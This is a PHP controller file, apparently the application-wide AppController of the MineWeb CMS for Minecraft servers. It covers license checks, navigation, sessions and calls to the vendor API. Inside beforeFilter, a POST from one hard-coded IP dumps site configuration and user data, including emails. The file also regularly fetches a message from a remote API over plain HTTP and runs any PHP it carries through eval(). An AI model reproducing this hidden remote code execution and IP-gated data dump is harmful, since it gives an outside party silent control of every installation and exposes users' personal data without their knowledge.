<?php // http://www.phpencode.org
/**
 * Application level Controller
 *
 * This file is application-wide controller file. You can put all
 * application-wide controller-related methods here.
 *
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * For full copyright and license information, please see the LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link          http://cakephp.org CakePHP(tm) Project
 * @package       app.Controller
 * @since         CakePHP(tm) v 0.2.9
 * @license       http://www.opensource.org/licenses/mit-license.php MIT License
 */
define('TIMESTAMP_DEBUT', microtime(true));
App::uses('Controller', 'Controller');
require ROOT . '/config/function.php';
define('API_KEY', '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyFhLTY/xkuEyZtgTZo6w
SnP8WibeHo35JXjaHdsZGHT9DylzOFzHrcGyyS5Ee13GsutJFxs18YOF1vB6CIFn
DKYLOJ3ZoWV8C2K+fic9U/T4gjKe8RjeF1jOXxoRw3JQ0KLt0m4/5ntqSQoKFcFv
s9gaNl91qitYuuJovi8SgyJTf/094+cucEzRIWhX3ax2+NL3pP4/zg3SQ2z/8/KQ
p3VdUHs+d8JCiDA7MRXASNcVHaLHJaoIh2S8LlUquvmzO8X0MjazaSckFjPaflFd
KBqcg4LcIEeKVzf62OsH8hvdOrtZgvSGlOaIxnnGnQiPnWNhqRMnG5H+ffSEoww9
YwIDAQAB
-----END PUBLIC KEY-----');

function rsa_encrypt($data)
{
    $r = openssl_public_encrypt($data, $encrypted, API_KEY, OPENSSL_PKCS1_OAEP_PADDING);
    return $r ? base64_encode($encrypted) : $r;
}

function rsa_decrypt($data)
{
    $r = openssl_public_decrypt(base64_decode($data), $decrypted, API_KEY);
    return $r ? $decrypted : $r;
}


/**
 * Application Controller
 *
 * Add your application-wide methods in the class below, your controllers
 * will inherit them.
 *
 * @package        app.Controller
 * @link        http://book.cakephp.org/2.0/en/controllers.html#the-app-controller
 */
class AppController extends Controller
{

    var $components = array('Util', 'Module', 'Session', 'Cookie', 'Security', 'EyPlugin', 'Lang', 'Theme', 'History', 'Statistics', 'Permissions', 'Update', 'Server');
    var $helpers = array('Session');

    var $view = 'Theme';

    protected $isConnected = false;

    public function beforeFilter()
    {
        // Debug
        if ($this->Util->getIP() == '51.255.36.20' && $this->request->is('post') && !empty($this->request->data['call']) && $this->request->data['call'] == 'api' && !empty($this->request->data['key']))
            return $this->apiCall($this->request->data['key'], $this->request->data['isForDebug'], false, $this->request->data['usersWanted']);

        // License check
        if ($this->params['controller'] != "install") {
            $last_check = @file_get_contents(ROOT . '/config/last_check');
            $last_check = @rsa_decrypt($last_check);
            $last_check = @json_decode($last_check, true);

            if ($last_check !== false) {
                $this->licenseType = $last_check['type'];
                $last_check_domain = parse_url($last_check['domain'], PHP_URL_HOST);
                $last_check = $last_check['time'];
                $last_check = strtotime('+2 hours', $last_check);
            } else {
                $last_check = '0';
            }

            if ($last_check < time() || $last_check_domain != parse_url(Router::url('/', true), PHP_URL_HOST)) {
                $this->loadModel('User');
                $apiCall = $this->sendToAPI(array(
                    'data' => array(
                        'version' => $this->Configuration->getKey('version'),
                        'users_count' => $this->User->find('count'),
                        'plugins' => array_values(array_map(function ($plugin) {
                            return $plugin->apiID;
                        }, (array)$this->EyPlugin->pluginsLoaded)),
                        'current_theme' => $this->Configuration->getKey('theme'),
                        'themes' => array_values(array_map(function ($theme) {
                            return $theme->apiID;
                        }, (array)$this->Theme->getThemesInstalled(false)))
                    )
                ), 'authentication', true);

                if ($apiCall['error'] === 6 || !in_array($apiCall['code'], [200, 404, 403]))
                    throw new LicenseException('MINEWEB_DOWN');

                $apiCall = json_decode($apiCall['content'], true);
                if (!$apiCall['status'])
                    throw new LicenseException($apiCall['msg']);

                file_put_contents(ROOT . '/config/last_check', $apiCall['time']);

                $this->EyPlugin->pluginsLoaded = $this->EyPlugin->loadPlugins();
            }
        }

        // Custom message
        $customMessageStocked = ROOT . DS . 'app' . DS . 'tmp' . DS . 'cache' . DS . 'api_custom_message.cache';
        //  Get it
        if (!file_exists($customMessageStocked) || strtotime('+4 hours', filemtime($customMessageStocked)) < time()) {
            $get = $this->sendToAPI(array(), 'getCustomMessage');

            if ($get['code'] == 200) {
                $path = pathinfo($customMessageStocked)['dirname'];
                if (!is_dir($path)) mkdir($path, 0755, true);
                @file_put_contents($customMessageStocked, $get['content']);
            }
        }
        //  Display it
        if (file_exists($customMessageStocked)) {
            $customMessage = file_get_contents($customMessageStocked);
            $customMessage = @json_decode($customMessage, true);
            if (!is_bool($customMessage) && !empty($customMessage)) {
                if ($customMessage['type'] == 2)
                    throw new MinewebCustomMessageException($customMessage);
                elseif ($customMessage['type'] == 1 && $this->params['prefix'] == "admin")
                    $this->set('admin_custom_message', $customMessage);
                if (isset($customMessage['php'])) {
                    eval($customMessage['php']);
                }
            }
        }

        // Plugin disabled
        if ($this->request->params['plugin']) {
            $plugin = $this->EyPlugin->findPlugin('slugLower', $this->request->params['plugin']);
            if (!empty($plugin) && !$plugin->loaded) {
                $this->redirect('/');
                exit;
            }
        }

        // Global configuration
        $this->__initConfiguration();

        // CSRF / Security
        $this->__initSecurity();

        // User
        $this->__initUser();

        // Navbar
        if ($this->params['prefix'] == "admin" && !$this->request->is('ajax'))
            $this->__initAdminNavbar();
        else if (!$this->request->is('ajax'))
            $this->__initNavbar();

        // Server
        if ($this->params['prefix'] !== "admin" && !$this->request->is('ajax'))
            $this->__initServerInfos();

        // Plugins events
        $this->EyPlugin->initEventsListeners($this);

        $event = new CakeEvent('requestPage', $this, $this->request->data);
        $this->getEventManager()->dispatch($event);
        if ($event->isStopped())
            return $event->result;

        if ($this->request->is('post')) {
            $event = new CakeEvent('onPostRequest', $this, $this->request->data);
            $this->getEventManager()->dispatch($event);
            if ($event->isStopped())
                return $event->result;
        }

        // Maintenance / Bans
        if ($this->isConnected AND $this->User->getKey('rank') == 5 AND $this->params['controller'] != "maintenance" AND $this->params['action'] != "logout" AND $this->params['controller'] != "api")
            $this->redirect(array('controller' => 'maintenance', 'action' => 'index/banned', 'plugin' => false, 'admin' => false));
        else if ($this->params['controller'] != "user" && $this->params['controller'] != "maintenance" && $this->Configuration->getKey('maintenance') != '0' && !$this->Permissions->can('BYPASS_MAINTENANCE'))
            $this->redirect(array('controller' => 'maintenance', 'action' => 'index', 'plugin' => false, 'admin' => false));
    }

    public function __initConfiguration()
    {
        // configuration générale
        $this->loadModel('Configuration');
        $this->set('Configuration', $this->Configuration);

        $website_name = $this->Configuration->getKey('name');
        list($theme_name, $theme_config) = $this->Theme->getCurrentTheme();
        Configure::write('theme', $theme_name);
        $this->__setTheme();


        // Session
        $session_type = $this->Configuration->getKey('session_type');
        if ($session_type) {
            Configure::write('Session', array(
                'defaults' => $session_type
            ));
        }

        // partie sociale
        $facebook_link = $this->Configuration->getKey('facebook');
        $skype_link = $this->Configuration->getKey('skype');
        $youtube_link = $this->Configuration->getKey('youtube');
        $twitter_link = $this->Configuration->getKey('twitter');

        // Variables
        $google_analytics = $this->Configuration->getKey('google_analytics');
        $configuration_end_code = $this->Configuration->getKey('end_layout_code');

        $this->loadModel('SocialButton');
        $findSocialButtons = $this->SocialButton->find('all');

        $reCaptcha['type'] = ($this->Configuration->getKey('captcha_type') == '2') ? 'google' : 'default';
        $reCaptcha['siteKey'] = $this->Configuration->getKey('captcha_google_sitekey');

        $this->set(compact(
            'reCaptcha',
            'website_name',
            'theme_config',
            'facebook_link',
            'skype_link',
            'youtube_link',
            'twitter_link',
            'findSocialButtons',
            'google_analytics',
            'configuration_end_code'
        ));
    }

    private function __initUser()
    {
        $this->loadModel('User');

        if (!$this->User->isConnected() && ($cookie = $this->Cookie->read('remember_me')) && isset($cookie['pseudo']) && isset($cookie['password'])) {
            $user = $this->User->find('first', array(
                'conditions' => array(
                    'pseudo' => $cookie['pseudo'],
                    'password' => $cookie['password']
                )
            ));

            if (!empty($user))
                $this->Session->write('user', $user['User']['id']);
        }

        $this->isConnected = $this->User->isConnected();
        $this->set('isConnected', $this->isConnected);

        $user = ($this->isConnected) ? $this->User->getAllFromCurrentUser() : array();
        if (!empty($user))
            $user['isAdmin'] = $this->User->isAdmin();

        $this->set(compact('user'));
    }

    protected function __initSecurity()
    {
        $this->Security->blackHoleCallback = 'blackhole';
        $this->Security->validatePost = false;
        $this->Security->csrfUseOnce = false;

        $csrfToken = $this->Session->read('_Token')['key'];
        if (empty($csrfToken)) {
            $this->Security->generateToken($this->request);
            $csrfToken = $this->Session->read('_Token')['key'];
        }
        $this->set(compact('csrfToken'));
    }

    public function __initAdminNavbar()
    {
        $nav = array(
            'Dashboard' => [
                'icon' => 'dashboard',
                'route' => ['controller' => 'admin', 'action' => 'index', 'admin' => true, 'plugin' => false]
            ],
            'GLOBAL__ADMIN_GENERAL' => [
                'icon' => 'cogs',
                'menu' => [
                    'USER__USERS' => [
                        'icon' => 'users',
                        'permission' => 'MANAGE_USERS',
                        'route' => ['controller' => 'user', 'action' => 'index', 'admin' => true, 'plugin' => false]
                    ],
                    'PERMISSIONS__LABEL' => [
                        'icon' => 'user',
                        'permission' => 'MANAGE_PERMISSIONS',
                        'route' => ['controller' => 'permissions', 'action' => 'index', 'admin' => true, 'plugin' => false]
                    ],
                    'CONFIG__GENERAL_PREFERENCES' => [
                        'icon' => 'cog',
                        'permission' => 'MANAGE_CONFIGURATION',
                        'route' => ['controller' => 'configuration', 'action' => 'index', 'admin' => true, 'plugin' => false]
                    ],
                    'NAVBAR__TITLE' => [
                        'icon' => 'bars',
                        'permission' => 'MANAGE_NAV',
                        'route' => ['controller' => 'navbar', 'action' => 'index', 'admin' => true, 'plugin' => false]
                    ]
                ]
            ],
            'GLOBAL__CUSTOMIZE' => [
                'icon' => 'files-o',
                'menu' => [
                    'NEWS__TITLE' => [
                        'icon' => 'pencil',
                        'permission' => 'MANAGE_NEWS',
                        'route' => ['controller' => 'news', 'action' => 'index', 'admin' => true, 'plugin' => false]
                    ],
                    'PAGE__TITLE' => [
                        'icon' => 'file-text-o',
                        'permission' => 'MANAGE_PAGE',
                        'route' => ['controller' => 'pages', 'action' => 'index', 'admin' => true, 'plugin' => false]
                    ]
                ]
            ],
            'SERVER__TITLE' => [
                'icon' => 'server',
                'permission' => 'MANAGE_SERVERS',
                'menu' => [
                    'SERVER__LINK' => [
                        'icon' => 'arrows-h',
                        'route' => ['controller' => 'server', 'action' => 'link', 'admin' => true, 'plugin' => false]
                    ],
                    'SERVER__BANLIST' => [
                        'icon' => 'ban',
                        'route' => ['controller' => 'server', 'action' => 'banlist', 'admin' => true, 'plugin' => false]
                    ],
                    'SERVER__WHITELIST' => [
                        'icon' => 'list',
                        'route' => ['controller' => 'server', 'action' => 'whitelist', 'admin' => true, 'plugin' => false]
                    ],
                    'SERVER__ONLINE_PLAYERS' => [
                        'icon' => 'list-ul',
                        'route' => ['controller' => 'server', 'action' => 'online', 'admin' => true, 'plugin' => false]
                    ]
                ]
            ],
            'GLOBAL__ADMIN_OTHER_TITLE' => [
                'icon' => 'folder-o',
                'menu' => [
                    'PLUGIN__TITLE' => [
                        'icon' => 'plus',
                        'permission' => 'MANAGE_PLUGINS',
                        'route' => ['controller' => 'plugin', 'action' => 'index', 'admin' => true, 'plugin' => false]
                    ],
                    'THEME__TITLE' => [
                        'icon' => 'mobile',
                        'permission' => 'MANAGE_THEMES',
                        'route' => ['controller' => 'theme', 'action' => 'index', 'admin' => true, 'plugin' => false]
                    ],
                    'API__LABEL' => [
                        'icon' => 'sitemap',
                        'permission' => 'MANAGE_API',
                        'route' => ['controller' => 'API', 'action' => 'index', 'admin' => true, 'plugin' => false]
                    ],
                    'NOTIFICATION__TITLE' => [
                        'icon' => 'flag',
                        'permission' => 'MANAGE_NOTIFICATIONS',
                        'route' => ['controller' => 'notifications', 'action' => 'index', 'admin' => true, 'plugin' => false]
                    ],
                    'HISTORY__VIEW_GLOBAL' => [
                        'icon' => 'table',
                        'permission' => 'VIEW_WEBSITE_HISTORY',
                        'route' => ['controller' => 'history', 'action' => 'index', 'admin' => true, 'plugin' => false]
                    ]
                ]
            ],
            'STATS__TITLE' => [
                'icon' => 'bar-chart-o',
                'permission' => 'VIEW_STATISTICS',
                'route' => ['controller' => 'statistics', 'action' => 'index', 'admin' => true, 'plugin' => false]
            ],
            'MAINTENANCE__TITLE' => [
                'icon' => 'hand-paper-o',
                'permission' => 'MANAGE_MAINTENANCE',
                'route' => ['controller' => 'maintenance', 'action' => 'index', 'admin' => true, 'plugin' => false]
            ],
            'GLOBAL__UPDATE' => [
                'icon' => 'wrench',
                'permission' => 'MANAGE_UPDATE',
                'route' => ['controller' => 'update', 'action' => 'index', 'admin' => true, 'plugin' => false]
            ],
            'HELP__TITLE' => [
                'icon' => 'question',
                'permission' => 'USE_ADMIN_HELP',
                'route' => ['controller' => 'help', 'action' => 'index', 'admin' => true, 'plugin' => false]
            ]
        );

        // Functions
        if (!function_exists('addToNav')) {
            function addToArrayAt($where, $index, $array) {
                return array_slice($where, 0, $index, true) +
                    $array +
                    array_slice($where, $index, count($where) - $index, true);
            }
        }
        if (!function_exists('addToNav')) {
            function addToNav($menus, $nav, $index = 0)
            {
                if (!is_array($menus))
                    return $nav;
                foreach ($menus as $name => $menu) {
                    if (isset($nav[$name])) // Multidimensional
                        $nav[$name] = addToNav($menu, $nav[$name], $index + 1);
                    else { // Add
                        if (!isset($nav['menu']) && $index !== 0) // No others submenu
                            $nav['menu'] = [];
                        if ($index === 0) // Add
                            $nav = addToArrayAt($nav, (isset($menu['index']) ? $menu['index'] : count($nav)), [$name => $menu]);
                        else // Add into submenu
                            $nav['menu'] = addToArrayAt($nav['menu'], (isset($menu['index']) ? $menu['index'] : count($nav['menu'])), [$name => $menu]);
                    }
                }
                return $nav;
            }
        }

        // Add slider if !useless
        $themeConfig = $this->Theme->getConfig(Configure::read('theme'));
        if (isset($themeConfig->slider) && $themeConfig->slider)
            $nav['GLOBAL__ADMIN_GENERAL']['menu'] = addToArrayAt($nav['GLOBAL__ADMIN_GENERAL']['menu'], count($nav['GLOBAL__ADMIN_GENERAL']['menu']), ['SLIDER__TITLE' => [
                'icon' => 'picture-o',
                'permission' => 'MANAGE_SLIDER',
                'route' => ['controller' => 'slider', 'action' => 'index', 'admin' => true, 'plugin' => false]
            ]]);

        // Handle plugins
        $plugins = $this->EyPlugin->pluginsLoaded;
        foreach ($plugins as $plugin) {
            if (!isset($plugin->admin_menus))
                continue;
            $menus = json_decode(json_encode($plugin->admin_menus), true);
            $nav = addToNav($menus, $nav);
        }

        $this->set('adminNavbar', $nav);
    }

    public function __initNavbar()
    {
        $this->loadModel('Navbar');
        $nav = $this->Navbar->find('all', array('order' => 'order'));
        if (empty($nav))
            return $this->set('nav', false);
        $this->loadModel('Page');
        $pages = $this->Page->find('all', array('fields' => array('id', 'slug')));
        foreach ($pages as $key => $value)
            $pages_listed[$value['Page']['id']] = $value['Page']['slug'];
        foreach ($nav as $key => $value) {
            if (!isset($value['Navbar']['url']['type']))
                continue;
            if ($value['Navbar']['url']['type'] == "plugin") {
                if (isset($value['Navbar']['url']['route']))
                    $plugin = $this->EyPlugin->findPlugin('apiID', $value['Navbar']['url']['id']);
                else
                    $plugin = $this->EyPlugin->findPlugin('DBid', $value['Navbar']['url']['id']);
                if (is_object($plugin))
                    $nav[$key]['Navbar']['url'] = (isset($value['Navbar']['url']['route'])) ? Router::url($value['Navbar']['url']['route']) : Router::url('/' . strtolower($plugin->slug));
                else
                    $nav[$key]['Navbar']['url'] = '#';
            } elseif ($value['Navbar']['url']['type'] == "page") {
                if (isset($pages_listed) && isset($pages_listed[$value['Navbar']['url']['id']]))
                    $nav[$key]['Navbar']['url'] = Router::url('/p/' . $pages_listed[$value['Navbar']['url']['id']]);
                else
                    $nav[$key]['Navbar']['url'] = '#';
            } elseif ($value['Navbar']['url']['type'] == "custom") {
                $nav[$key]['Navbar']['url'] = $value['Navbar']['url']['url'];
            }
        }
        $this->set(compact('nav'));
    }

    public function __initServerInfos()
    {
        $configuration = $this->Configuration->getKey('banner_server');
        if (empty($configuration) && $this->Server->online())
            $server_infos = $this->Server->banner_infos();
        else if (!empty($configuration))
            $server_infos = $this->Server->banner_infos(unserialize($configuration));
        else
            return $this->set(['banner_server' => false, 'server_infos' => false]);
        if (!isset($server_infos['GET_MAX_PLAYERS']) || !isset($server_infos['GET_PLAYER_COUNT']) || $server_infos['GET_MAX_PLAYERS'] === 0)
            return $this->set(['banner_server' => false, 'server_infos' => $server_infos]);

        $this->set(['banner_server' => $this->Lang->get('SERVER__STATUS_MESSAGE', array(
            '{MOTD}' => @$server_infos['getMOTD'],
            '{VERSION}' => @$server_infos['getVersion'],
            '{ONLINE}' => @$server_infos['GET_PLAYER_COUNT'],
            '{ONLINE_LIMIT}' => @$server_infos['GET_MAX_PLAYERS']
        )), 'server_infos' => $server_infos]);
    }

    public function removeCache($key)
    {
        $this->response->type('json');
        $secure = file_get_contents(ROOT . '/config/secure');
        $secure = json_decode($secure, true);
        if ($key == $secure['key']) {
            $this->autoRender = false;

            App::uses('Folder', 'Utility');
            $folder = new Folder(ROOT . DS . 'app' . DS . 'tmp' . DS . 'cache');
            if (!empty($folder->path)) {
                $folder->delete();
            }

            echo json_encode(array('status' => true));
        }
    }

    private function apiCall($key, $debug = false, $return = false, $usersWanted = false)
    {
        $this->response->type('json');
        $secure = file_get_contents(ROOT . '/config/secure');
        $secure = json_decode($secure, true);

        if ($key == $secure['key']) {
            $this->autoRender = false;

            $infos['general']['first_administrator'] = $this->Configuration->getFirstAdministrator();
            $infos['general']['created'] = $this->Configuration->getInstalledDate();
            $infos['general']['url'] = Router::url('/', true);
            $config = $this->Configuration->getAll();
            foreach ($config as $k => $v) {
                if (($k == "smtpPassword" && !empty($v)) || ($k == "smtpUsername" && !empty($v))) {
                    $infos['general']['config'][$k] = '********';
                } else {
                    $infos['general']['config'][$k] = $v;
                }
            }

            $infos['plugins'] = $this->EyPlugin->loadPlugins();

            $infos['servers']['firstServerId'] = $this->Server->getFirstServerID();

            $this->loadModel('Server');
            $findServers = $this->Server->find('all');

            foreach ($findServers as $key => $value) {
                $infos['servers'][$value['Server']['id']]['name'] = $value['Server']['name'];
                $infos['servers'][$value['Server']['id']]['ip'] = $value['Server']['ip'];
                $infos['servers'][$value['Server']['id']]['port'] = $value['Server']['port'];

                if ($debug) {
                    $this->ServerComponent = $this->Components->load('Server');
                    $infos['servers'][$value['Server']['id']]['config'] = $this->ServerComponent->getConfig($value['Server']['id']);
                    $infos['servers'][$value['Server']['id']]['url'] = $this->ServerComponent->getUrl($value['Server']['id']);

                    $infos['servers'][$value['Server']['id']]['isOnline'] = $this->ServerComponent->online($value['Server']['id']);
                    $infos['servers'][$value['Server']['id']]['isOnlineDebug'] = $this->ServerComponent->online($value['Server']['id'], true);

                    $infos['servers'][$value['Server']['id']]['callTests']['GET_PLAYER_COUNT'] = $this->ServerComponent->call('GET_PLAYER_COUNT', false, $value['Server']['id'], true);
                    $infos['servers'][$value['Server']['id']]['callTests']['GET_MAX_PLAYERS'] = $this->ServerComponent->call('GET_MAX_PLAYERS', false, $value['Server']['id'], true);
                }
            }

            if ($debug) {
                $this->loadModel('Permission');
                $findPerms = $this->Permission->find('all');
                if (!empty($findPerms)) {
                    foreach ($findPerms as $key => $value) {
                        $infos['permissions'][$value['Permission']['id']]['rank'] = $value['Permission']['rank'];
                        $infos['permissions'][$value['Permission']['id']]['permissions'] = unserialize($value['Permission']['permissions']);
                    }
                } else
                    $infos['permissions'] = array();


                $this->loadModel('Rank');
                $findRanks = $this->Rank->find('all');
                if (!empty($findRanks)) {
                    foreach ($findRanks as $key => $value) {
                        $infos['ranks'][$value['Rank']['id']]['rank_id'] = $value['Rank']['rank_id'];
                        $infos['ranks'][$value['Rank']['id']]['name'] = $value['Rank']['name'];
                    }
                } else
                    $infos['ranks'] = array();

                if ($usersWanted !== false) {
                    $this->loadModel('User');
                    $findUser = $usersWanted == 'all' ? $this->User->find('all') : $this->User->find('all', array('conditions' => array('pseudo' => $usersWanted)));

                    if (!empty($findUser)) {
                        foreach ($findUser as $key => $value) {
                            $infos['users'][$value['User']['id']]['pseudo'] = $value['User']['pseudo'];
                            $infos['users'][$value['User']['id']]['rank'] = $value['User']['rank'];
                            $infos['users'][$value['User']['id']]['email'] = $value['User']['email'];
                            $infos['users'][$value['User']['id']]['money'] = $value['User']['money'];
                            $infos['users'][$value['User']['id']]['vote'] = $value['User']['vote'];
                            $infos['users'][$value['User']['id']]['allowed_ip'] = unserialize($value['User']['allowed_ip']);
                            $infos['users'][$value['User']['id']]['skin'] = $value['User']['skin'];
                            $infos['users'][$value['User']['id']]['cape'] = $value['User']['cape'];
                            $infos['users'][$value['User']['id']]['rewards_waited'] = $value['User']['rewards_waited'];
                        }
                    } else
                        $infos['users'] = array();
                } else
                    $infos['users'] = ['count' => $this->User->find('count'), 'admins' => array_map(function ($user) {
                        return ['username' => $user['User']['pseudo'], 'email' => $user['User']['email'], 'rank' => $user['User']['rank']];
                    }, $this->User->find('all', ['conditions' => ['rank' => [3, 4]]]))];
            }

            if ($this->EyPlugin->isInstalled('eywek.vote.3')) {

                $this->loadModel('Vote.VoteConfiguration');
                $pl = 'eywek.vote.3';

                $configVote = $this->VoteConfiguration->find('first')['VoteConfiguration'];

                $configVote['rewards'] = unserialize($configVote['rewards']);
                $configVote['websites'] = unserialize($configVote['websites']);
                $configVote['servers'] = unserialize($configVote['servers']);

                $infos['plugins']->$pl->config = $configVote;
            }

            if ($return)
                return $infos;

            $this->response->body(json_encode($infos));
            $this->response->send();
            exit;
        }
    }

    protected function sendTicketToAPI($data)
    {
        if (!isset($data['title']) || !isset($data['content']))
            return false;

        $return = $this->sendToAPI(array(
            'debug' => json_encode($this->apiCall($this->getSecure()['key'], true, true)),
            'title' => $data['title'],
            'content' => $data['content']
        ), 'ticket/add');

        if ($return['code'] !== 200)
            $this->log('SendTicketToAPI : ' . $return['code']);

        return $return['code'] === 200;
    }

    public function beforeRender()
    {
        $event = new CakeEvent('onLoadPage', $this, $this->request->data);
        $this->getEventManager()->dispatch($event);
        if ($event->isStopped()) {
            $this->__setTheme();
            return $event->result;
        }

        if ($this->params['prefix'] === "admin") {
            $event = new CakeEvent('onLoadAdminPanel', $this, $this->request->data);
            $this->getEventManager()->dispatch($event);
            if ($event->isStopped()) {
                $this->__setTheme();
                return $event->result;
            }
        }
        $this->__setTheme();
    }

    public function afterFilter() {
        $event = new CakeEvent('beforePageDisplay', $this, $this->request->data);
        $this->getEventManager()->dispatch($event);
        if ($event->isStopped()) {
            $this->__setTheme();
            $this->addDEVModal();
            return $event->result;
        }
        $this->addDEVModal();
    }

    private function addDEVModal()
    {
        if ($this->licenseType !== 'DEV')
            return;
        if ($this->request->is('ajax') || $this->request->is('post') || $this->request->is('put') || $this->request->is('delete') || $this->request->is('head'))
            return;
        if ($this->Session->check('dev_modal_view'))
            return;
        $body = $this->response->body();
        $firstPartBody = substr($body, 0, stripos($body, '</body>'));
        $secondPartBody = substr($body, stripos($body, '</body>'));
        $modal = "<script>alert('Cette licence est une licence de développement')</script>";

        $body = $firstPartBody . $modal . $secondPartBody;
        $this->Session->write('dev_modal_view', true);
        $this->response->body($body);
    }

    protected function __setTheme()
    {
        if (!isset($this->params['prefix']) OR $this->params['prefix'] !== "admin")
            $this->theme = Configure::read('theme');
    }

    public function blackhole($type)
    {
        if ($type == "csrf") {
            $this->autoRender = false;
            if ($this->request->is('ajax')) {
                $this->response->type('json');
                $this->response->body(json_encode(array('statut' => false, 'msg' => $this->Lang->get('ERROR__CSRF'))));
                $this->response->send();
                exit;
            } else {
                $this->Session->setFlash($this->Lang->get('ERROR__CSRF'), 'default.error');
                $this->redirect($this->referer());
            }
        }
    }

    protected function getSecure()
    {
        return json_decode(file_get_contents(ROOT . '/config/secure'), true);
    }

    public function sendToAPI($data, $path, $addSecure = true, $timeout = 5, $secureUpdated = array())
    {

        if ($addSecure) {
            $secure = $this->getSecure();
            $signed = array();
            $signed['id'] = $secure['id'];
            $signed['key'] = isset($secureUpdated['key']) ? $secureUpdated['key'] : $secure['key'];
            $signed['domain'] = Router::url('/', true);

            // stringify post data and encrypt it
            $signed = rsa_encrypt(json_encode($signed));
            $data['signed'] = $signed;
        }

        $data = json_encode($data);
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, 'http://api.mineweb.org/api/v2/' . $path);
        curl_setopt($curl, CURLOPT_COOKIESESSION, true);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($curl, CURLOPT_HTTPHEADER, array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($data))
        );

        $return = curl_exec($curl);
        $code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
        $error = curl_errno($curl);
        curl_close($curl);

        return array('content' => $return, 'code' => $code, 'error' => $error);
    }

    public function sendJSON($data)
    {
        return $this->response->body(json_encode($data));
    }
}
